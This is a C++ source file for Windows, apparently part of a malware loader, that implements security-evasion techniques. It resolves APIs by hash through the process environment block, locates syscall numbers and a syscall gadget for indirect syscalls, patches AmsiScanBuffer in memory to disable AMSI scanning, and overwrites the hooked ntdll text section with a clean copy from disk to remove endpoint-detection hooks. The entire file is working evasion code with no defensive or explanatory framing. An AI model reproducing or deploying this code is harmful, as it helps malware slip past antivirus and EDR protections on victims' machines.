#include "Stealth.h"
#include <winternl.h>
#include <intrin.h>
#include <vector>
#include <ctype.h>
#include <tlhelp32.h>
#include "Obfuscator.h"

namespace Stealth {

    std::wstring DecryptInternal(const std::vector<unsigned char>& data, unsigned char key) {
        std::string dec;
        for (auto b : data) dec += (char)(b ^ key);
        std::wstring wdec;
        for (char c : dec) wdec += (wchar_t)c;
        return wdec;
    }

    bool StrCompare(const char* s1, const char* s2) {
        while (*s1 && (*s1 == *s2)) { s1++; s2++; }
        return *(unsigned char*)s1 - *(unsigned char*)s2 == 0;
    }

    #ifdef _WIN64
    #define GetPEB() (PPEB)__readgsqword(0x60)
    #else
    #define GetPEB() (PPEB)__readfsdword(0x30)
    #endif

    HMODULE GetModuleByHash(DWORD moduleHash) {
        PPEB peb = GetPEB();
        PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
        PLIST_ENTRY curr = head->Flink;
        while (curr != head) {
            PLDR_DATA_TABLE_ENTRY entry = CONTAINING_RECORD(curr, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
            if (entry->FullDllName.Buffer) {
                std::wstring wname(entry->FullDllName.Buffer);
                std::string sName;
                for (wchar_t wc : wname) sName += (char)tolower((int)wc);
                size_t lastSlash = sName.find_last_of("\\/");
                std::string filename = (lastSlash == std::string::npos) ? sName : sName.substr(lastSlash + 1);
                if (HashApi(filename.c_str()) == moduleHash) return (HMODULE)entry->DllBase;
            }
            curr = curr->Flink;
        }
        return nullptr;
    }

    FARPROC GetApiByHash(HMODULE hModule, DWORD funcHash) {
        if (!hModule) return nullptr;
        PBYTE base = (PBYTE)hModule;
        PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)base;
        PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)(base + dosHeader->e_lfanew);
        DWORD exportDirRVA = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
        if (exportDirRVA == 0) return nullptr;
        PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)(base + exportDirRVA);
        PDWORD names = (PDWORD)(base + exportDir->AddressOfNames);
        PDWORD functions = (PDWORD)(base + exportDir->AddressOfFunctions);
        PWORD ordinals = (PWORD)(base + exportDir->AddressOfNameOrdinals);
        for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
            if (HashApi((const char*)(base + names[i])) == funcHash)
                return (FARPROC)(base + functions[ordinals[i]]);
        }
        return nullptr;
    }

    WORD GetSSNByHash(DWORD funcHash) {
        HMODULE hNtdll = GetModuleByHash(Hashes::ntdll);
        PVOID pFunc = (PVOID)GetApiByHash(hNtdll, funcHash);
        if (!pFunc) return 0;
        PBYTE pFuncByte = (PBYTE)pFunc;
        for (int i = 0; i < 32; i++) {
            if (pFuncByte[i] == 0xB8) return *(PWORD)(pFuncByte + i + 1);
        }
        for (int i = 1; i < 500; i++) {
            PBYTE pPrev = pFuncByte - (i * 32);
            if (*pPrev == 0x4C && *(pPrev + 3) == 0xB8) return *(PWORD)(pPrev + 4) + i;
            PBYTE pNext = pFuncByte + (i * 32);
            if (*pNext == 0x4C && *(pNext + 3) == 0xB8) return *(PWORD)(pNext + 4) - i;
        }
        return 0;
    }

    PVOID GetSyscallGadget() {
        HMODULE hNtdll = GetModuleByHash(Hashes::ntdll);
        PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
        PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + dos->e_lfanew);
        PIMAGE_SECTION_HEADER text = IMAGE_FIRST_SECTION(nt);
        PBYTE start = (PBYTE)hNtdll + text->VirtualAddress;
        PBYTE end = start + text->Misc.VirtualSize;
        for (PBYTE p = start; p < end - 2; p++) {
            if (p[0] == 0x0F && p[1] == 0x05 && p[2] == 0xC3) return (PVOID)p;
        }
        return nullptr;
    }

    void SetThreadsState(bool suspend) {
        DWORD pid = CALL_API(Hashes::kernel32, Hashes::GetCurrentProcessId, GetCurrentProcessId);
        DWORD tid = CALL_API(Hashes::kernel32, Hashes::GetCurrentThreadId, GetCurrentThreadId);
        HANDLE hSnap = (HANDLE)CALL_API(Hashes::kernel32, Hashes::CreateToolhelp32Snapshot, CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, 0);
        if (hSnap == INVALID_HANDLE_VALUE) return;
        THREADENTRY32 te = { sizeof(te) };
        if (CALL_API(Hashes::kernel32, Hashes::Thread32First, Thread32First, hSnap, &te)) {
            do {
                if (te.th32OwnerProcessID == pid && te.th32ThreadID != tid) {
                    HANDLE hThread = (HANDLE)CALL_API(Hashes::kernel32, Hashes::OpenProcess, OpenProcess, THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
                    if (hThread) {
                        if (suspend) CALL_API(Hashes::kernel32, Hashes::SuspendThread, SuspendThread, hThread);
                        else CALL_API(Hashes::kernel32, Hashes::ResumeThread, ResumeThread, hThread);
                        CALL_API(Hashes::kernel32, Hashes::CloseHandle, CloseHandle, hThread);
                    }
                }
            } while (CALL_API(Hashes::kernel32, Hashes::Thread32Next, Thread32Next, hSnap, &te));
        }
        CALL_API(Hashes::kernel32, Hashes::CloseHandle, CloseHandle, hSnap);
    }

    #ifdef _WIN64
    extern "C" NTSTATUS IndirectSyscall(WORD ssn, PVOID gadget, ...);
    #endif

    void BypassAMSI() {
        HMODULE hKernel32 = GetModuleByHash(Hashes::kernel32);
        auto pLoadLibraryW = (HMODULE(WINAPI*)(LPCWSTR))GetApiByHash(hKernel32, Hashes::LoadLibraryW);
        if (!pLoadLibraryW) return;
        HMODULE hAmsi = pLoadLibraryW(DecryptInternal({0x61, 0x6d, 0x73, 0x69, 0x2e, 0x64, 0x6c, 0x6c}, 0x00).c_str());
        if (!hAmsi) return;
        void* pScanBuffer = (void*)GetApiByHash(hAmsi, HashApi("AmsiScanBuffer"));
        if (!pScanBuffer) return;
        WORD ssnProtect = GetSSNByHash(Hashes::NtProtectVirtualMemory);
        PVOID gadget = GetSyscallGadget();
        if (ssnProtect && gadget) {
            DWORD oldProtect; PVOID base = pScanBuffer; SIZE_T size = 16;
            #ifdef _WIN64
            if (IndirectSyscall(ssnProtect, gadget, (HANDLE)-1, &base, &size, PAGE_EXECUTE_READWRITE, &oldProtect) == 0) {
                unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                memcpy(pScanBuffer, patch, sizeof(patch));
                IndirectSyscall(ssnProtect, gadget, (HANDLE)-1, &base, &size, oldProtect, &oldProtect);
            }
            #endif
        }
    }

    void UnhookNtdll() {
        HMODULE hKernel32 = GetModuleByHash(Hashes::kernel32);
        HMODULE hNtdll = GetModuleByHash(Hashes::ntdll);
        if (!hKernel32 || !hNtdll) return;
        auto pCreateFileW = (HANDLE(WINAPI*)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE))GetApiByHash(hKernel32, Hashes::CreateFileW);
        if (!pCreateFileW) return;
        std::wstring path = DecryptInternal({0x43, 0x3a, 0x5c, 0x57, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73, 0x5c, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x33, 0x32, 0x5c, 0x6e, 0x74, 0x64, 0x6c, 0x6c, 0x2e, 0x64, 0x6c, 0x6c}, 0x00);
        HANDLE hFile = pCreateFileW(path.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return;
        WORD ssnCreateSection = GetSSNByHash(Hashes::NtCreateSection);
        WORD ssnMapView = GetSSNByHash(Hashes::NtMapViewOfSection);
        WORD ssnProtect = GetSSNByHash(Hashes::NtProtectVirtualMemory);
        PVOID gadget = GetSyscallGadget();
        if (ssnCreateSection && ssnMapView && gadget) {
            HANDLE hSection = NULL;
            #ifdef _WIN64
            if (IndirectSyscall(ssnCreateSection, gadget, &hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile) == 0) {
                PVOID pMapping = NULL; SIZE_T viewSize = 0;
                if (IndirectSyscall(ssnMapView, gadget, hSection, (HANDLE)-1, &pMapping, 0, 0, NULL, &viewSize, 1, 0, PAGE_READONLY) == 0) {
                    SetThreadsState(true);
                    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hNtdll;
                    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + dosHeader->e_lfanew);
                    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
                        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((PBYTE)IMAGE_FIRST_SECTION(ntHeaders) + (i * IMAGE_SIZEOF_SECTION_HEADER));
                        if (StrCompare((const char*)sectionHeader->Name, ".text")) {
                            DWORD oldProtect; PVOID lpAddress = (PVOID)((PBYTE)hNtdll + sectionHeader->VirtualAddress); SIZE_T dwSize = sectionHeader->Misc.VirtualSize;
                            if (IndirectSyscall(ssnProtect, gadget, (HANDLE)-1, &lpAddress, &dwSize, PAGE_EXECUTE_READWRITE, &oldProtect) == 0) {
                                memcpy(lpAddress, (PVOID)((PBYTE)pMapping + sectionHeader->VirtualAddress), dwSize);
                                IndirectSyscall(ssnProtect, gadget, (HANDLE)-1, &lpAddress, &dwSize, oldProtect, &oldProtect);
                            }
                            break;
                        }
                    }
                    SetThreadsState(false);
                }
            }
            #endif
        }
        CALL_API(Hashes::kernel32, Hashes::CloseHandle, CloseHandle, hFile);
    }

    void Initialize() {
        UnhookNtdll();
        BypassAMSI();
    }
}
